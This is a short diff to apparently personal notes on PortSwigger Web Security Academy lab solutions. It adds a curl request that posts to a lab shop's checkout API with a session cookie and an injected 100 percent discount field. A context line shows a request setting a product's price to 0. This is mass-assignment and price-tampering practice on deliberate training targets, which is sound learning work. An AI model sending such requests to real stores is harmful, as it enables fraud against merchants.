@@ -20,3 +20,11 @@ curl -X PATCH https://0a8200d403af68b280a4307f00cc0063.web-security-academy.net/
 e -d '{"price":0}' -H 'Cookie: session=lzNDDGErMDObJ2YNiFeCYWPcrGi4en9m' -H 'Content-Type: application/json'
 ```
 
+___
+
+```bash
+curl -X POST https://0a88007104bb78eb82061ac200d600e9.web-security-academy.net/api/checkout -H 'Coo  
+kie: session=5ruUmRzO6InKX10BeH9MhoKEPxCSXjqC' -H 'Content-Type: application/json' -d '{"chosen_products":[{"product_id":"1",  
+"quantity":1}],"chosen_discount":{"percentage":100}}' -i
+```
+
